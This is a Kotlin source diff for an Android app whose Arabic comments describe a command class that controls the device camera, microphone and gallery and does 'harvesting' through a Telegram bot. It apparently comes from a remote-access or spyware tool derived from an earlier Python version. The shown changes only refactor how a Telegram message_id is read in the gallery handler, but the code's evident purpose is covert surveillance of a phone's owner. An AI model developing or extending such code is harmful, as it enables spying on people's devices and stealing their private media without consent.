@@ -14,6 +14,11 @@ import java.io.File
 import java.lang.ref.WeakReference
 import java.security.MessageDigest
 
+// ✅ استيراد دوال safeGet من MapExtensions.kt
+import com.example.app.safeGetMessageId
+import com.example.app.safeExtractCallbackData
+import com.example.app.CallbackData
+
 /**
  * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
  * هذه الفئة هي بديل commands.py مع حذف أوامر SMS وسجل الاتصالات.
@@ -740,7 +745,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج فتح المعرض (Media) - ✅ تم إصلاح استخدام safeGetMap
+    //  معالج فتح المعرض (Media) - ✅ استخدام safeGetMessageId
     // ============================================================
 
     private suspend fun handleMedia(tg: Any?, m: Any?, cid: Long) {
@@ -750,8 +755,8 @@ class Commands private constructor(context: Context) {
                 val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
                 val jsonKb = kb?.toString() ?: ""
                 val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
-                // ✅ استخراج message_id باستخدام safeGet (تم إزالة ? الزائدة)
-                val msgId = response.safeGetMap("result")?.safeGet("message_id") as? Number
+                // ✅ استخدام safeGetMessageId بدلاً من السلسلة الطويلة
+                val msgId = response.safeGetMessageId()
                 if (msgId != null) {
                     setModuleField(m, "last_mid", msgId)
                 }
